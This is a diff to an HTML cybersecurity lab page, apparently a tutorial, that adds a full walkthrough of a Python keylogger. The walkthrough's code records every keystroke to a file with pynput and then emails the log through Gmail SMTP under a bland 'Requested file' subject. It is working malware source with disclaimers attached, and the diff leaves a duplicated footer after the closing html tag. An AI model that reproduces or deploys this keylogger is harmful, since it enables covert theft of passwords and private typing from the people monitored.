@@ -28,7 +28,7 @@
             <div class="section-content">
                 <p>Create a simple key logger to learn input monitoring. Use <strong>pynput</strong> or <strong>keyboard</strong> to capture keystrokes.</p>
                 <div class="warning">
-                    <strong>Warning:</strong> Keyloggers are considered malware. Never deploy without consent. For learning only.
+                    <strong>Warning:</strong> Keyloggers are considered malware. Never deploy without explicit consent from all parties involved. This code is for educational purposes only in a controlled, authorized environment.
                 </div>
                 <p>Topics include:</p>
                 <ul>
@@ -37,12 +37,171 @@
                     <li>Stealth techniques</li>
                     <li>Anti-detection and ethical considerations</li>
                 </ul>
-                <!-- Add code snippets or lab exercises here -->
+            </div>
+        </div>
+
+        <div class="lab-section">
+            <div class="section-header">Key Logger Code Walkthrough</div>
+            <div class="section-content">
+                <p>Below is a step-by-step explanation of a Python key logger that captures keystrokes, logs them to a file, and optionally emails the log. This is for <strong>educational purposes only</strong>. Always obtain permission before monitoring any system.</p>
+                
+                <h3>Step 1: Import Libraries and Set Up Constants</h3>
+                <p>Import libraries for keyboard input, file handling, threading, and email sending. Define constants for file paths and timing.</p>
+                <pre><code><span class="keyword">from</span> pynput <span class="keyword">import</span> keyboard
+<span class="keyword">import</span> time
+<span class="keyword">import</span> threading
+<span class="keyword">import</span> os
+<span class="keyword">import</span> smtplib
+<span class="keyword">import</span> traceback
+<span class="keyword">from</span> email.message <span class="keyword">import</span> EmailMessage
+
+FILE_PATH = <span class="string">"keystroke.txt"</span>
+IDLE_SECONDS = 10
+BACKSPACE_LIMIT = 3
+                </code></pre>
+                <p><strong>Explanation</strong>: <code>pynput.keyboard</code> captures keystrokes, <code>time</code> tracks timing, <code>threading</code> ensures thread-safe file writing, <code>os</code> checks files, and <code>smtplib</code>/<code>EmailMessage</code> handle email sending. Constants define the log file name and timing thresholds.</p>
+
+                <h3>Step 2: Initialize File and Global Variables</h3>
+                <p>Read any existing log file and set up global variables for tracking keystrokes and timing.</p>
+                <pre><code>file_content = <span class="string">""</span>
+<span class="keyword">try</span>:
+    <span class="keyword">with</span> open(FILE_PATH, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:
+        file_content = f.read()
+<span class="keyword">except</span> FileNotFoundError:
+    <span class="keyword">pass</span>
+
+last_time = time.time()
+lock = threading.Lock()
+                </code></pre>
+                <p><strong>Explanation</strong>: The script tries to read the existing <code>keystroke.txt</code> file to preserve previous logs. <code>last_time</code> tracks the last keypress, and <code>lock</code> prevents threading conflicts when writing to the file.</p>
+
+                <h3>Step 3: Save Keystrokes to File</h3>
+                <p>Define a function to save the captured keystrokes to the log file.</p>
+                <pre><code><span class="keyword">def</span> flush_to_file():
+    <span class="comment">"""Save the current file content."""</span>
+    <span class="keyword">with</span> open(FILE_PATH, <span class="string">"w"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:
+        f.write(file_content)
+                </code></pre>
+                <p><strong>Explanation</strong>: This function writes the <code>file_content</code> string to <code>keystroke.txt</code>, overwriting it with each update to keep the log current.</p>
+
+                <h3>Step 4: Capture and Process Keystrokes</h3>
+                <p>Handle keypress events to log characters, spaces, enters, and backspaces.</p>
+                <pre><code><span class="keyword">def</span> keyPressed(key):
+    <span class="keyword">global</span> file_content, last_time
+    current_time = time.time()
+
+    <span class="keyword">with</span> lock:
+        <span class="comment"># Add newline if idle for 10 seconds</span>
+        <span class="keyword">if</span> current_time - last_time >= IDLE_SECONDS:
+            file_content += <span class="string">"\n"</span>
+
+        <span class="comment"># Handle key press</span>
+        <span class="keyword">try</span>:
+            ch = key.char
+            file_content += ch
+        <span class="keyword">except</span> AttributeError:
+            <span class="keyword">if</span> key == keyboard.Key.space:
+                file_content += <span class="string">" "</span>
+            <span class="keyword">elif</span> key == keyboard.Key.enter:
+                file_content += <span class="string">"\n"</span>
+            <span class="keyword">elif</span> key == keyboard.Key.backspace:
+                <span class="comment"># Only delete if within BACKSPACE_LIMIT seconds</span>
+                <span class="keyword">if</span> current_time - last_time <= BACKSPACE_LIMIT <span class="keyword">and</span> len(file_content) > 0:
+                    file_content = file_content[:-1]
+                <span class="keyword">else</span>:
+                    file_content += <span class="string">"[Backspace-Ignored]"</span>
+            <span class="keyword">else</span>:
+                file_content += <span class="string">f"[{key}]"</span>
+
+        flush_to_file()
+        last_time = current_time
+                </code></pre>
+                <p><strong>Explanation</strong>: The <code>keyPressed</code> function logs printable characters directly, converts special keys (space, enter) to appropriate symbols, and handles backspaces (deleting the last character if within 3 seconds, otherwise logging it). The <code>lock</code> ensures thread safety, and <code>flush_to_file</code> saves changes.</p>
+
+                <h3>Step 5: Stop the Key Logger</h3>
+                <p>Stop the key logger when the Esc key is pressed.</p>
+                <pre><code><span class="keyword">def</span> on_release(key):
+    <span class="keyword">if</span> key == keyboard.Key.esc:
+        print(<span class="string">"Exiting..."</span>)
+        <span class="keyword">return</span> False
+                </code></pre>
+                <p><strong>Explanation</strong>: The <code>on_release</code> function stops the listener when the Esc key is pressed, ending the program.</p>
+
+                <h3>Step 6: Run the Key Logger</h3>
+                <p>Start the keyboard listener to capture keypresses.</p>
+                <pre><code><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
+    print(<span class="string">"Key listener started. Press Esc to stop."</span>)
+    <span class="keyword">with</span> keyboard.Listener(on_press=keyPressed, on_release=on_release) <span class="keyword">as</span> listener:
+        listener.join()
+                </code></pre>
+                <p><strong>Explanation</strong>: This block starts the key logger, printing a message and listening for keypresses until Esc is pressed.</p>
+
+                <h3>Step 7: Email the Log File</h3>
+                <p>Send the log file via email using SMTP after a delay.</p>
+                <pre><code>SENDER = <span class="string">"[your-email]@gmail.com"</span>
+RECIPIENT = <span class="string">"[recipient-email]@gmail.com"</span>
+APP_PASSWORD = <span class="string">"[your-app-password]"</span>
+FILE_PATH = <span class="string">"keystroke.txt"</span>
+WAIT_SECONDS = 10
+SMTP_SERVER = <span class="string">"smtp.gmail.com"</span>
+SMTP_PORT = 587
+SUBJECT = <span class="string">"Requested file (one-time send)"</span>
+BODY = <span class="string">"Attached is the file you requested."</span>
+
+<span class="keyword">def</span> make_message(sender, recipient, subject, body, file_path):
+    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):
+        <span class="keyword">raise</span> FileNotFoundError(<span class="string">f"File not found: {file_path}"</span>)
+    msg = EmailMessage()
+    msg[<span class="string">"From"</span>] = sender
+    msg[<span class="string">"To"</span>] = recipient
+    msg[<span class="string">"Subject"</span>] = subject
+    msg.set_content(body)
+    <span class="keyword">with</span> open(file_path, <span class="string">"rb"</span>) <span class="keyword">as</span> f:
+        data = f.read()
+    filename = os.path.basename(file_path)
+    msg.add_attachment(data, maintype=<span class="string">"application"</span>, subtype=<span class="string">"octet-stream"</span>, filename=filename)
+    <span class="keyword">return</span> msg
+
+<span class="keyword">def</span> send_email(msg, server, port, sender, password):
+    <span class="keyword">with</span> smtplib.SMTP(server, port) <span class="keyword">as</span> s:
+        s.ehlo()
+        s.starttls()
+        s.login(sender, password)
+        s.send_message(msg)
+
+<span class="keyword">def</span> main():
+    print(<span class="string">f"Waiting {WAIT_SECONDS} seconds before sending {FILE_PATH}..."</span>)
+    <span class="keyword">try</span>:
+        time.sleep(WAIT_SECONDS)
+    <span class="keyword">except</span> KeyboardInterrupt:
+        print(<span class="string">"Interrupted before send. Exiting."</span>)
+        <span class="keyword">return</span>
+
+    <span class="keyword">try</span>:
+        message = make_message(SENDER, RECIPIENT, SUBJECT, BODY, FILE_PATH)
+        send_email(message, SMTP_SERVER, SMTP_PORT, SENDER, APP_PASSWORD)
+        print(<span class="string">f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Sent {FILE_PATH} to {RECIPIENT}"</span>)
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        print(<span class="string">"Error while sending file:"</span>)
+        traceback.print_exc()
+
+<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
+    main()
+                </code></pre>
+                <p><strong>Explanation</strong>: This section configures email settings (using placeholders for sensitive data), creates an email with the log file as an attachment, and sends it via Gmail’s SMTP server after a 10-second delay. Error handling ensures robustness.</p>
+
+                <div class="warning">
+                    <strong>Legal Reminder:</strong> Sending key logs without consent is illegal and unethical. This code is for learning in a controlled environment (e.g., your own computer or a lab with permission).
+                </div>
             </div>
         </div>
     </main>
 
     <footer>
+        <p>© 2025 Cyber Lab | <a href="#">Privacy Policy</a> | For Educational & Authorized Testing Only | Created By - ESCXSPACE</p>
+    </footer>
+</body>
+</html>
         <p>© 2025 Cyber Lab | <a href="#">Privacy Policy</a> | For Educational & Authorized Testing Only | Created By - ESCXSPACE</p>
     </footer>
 </body>
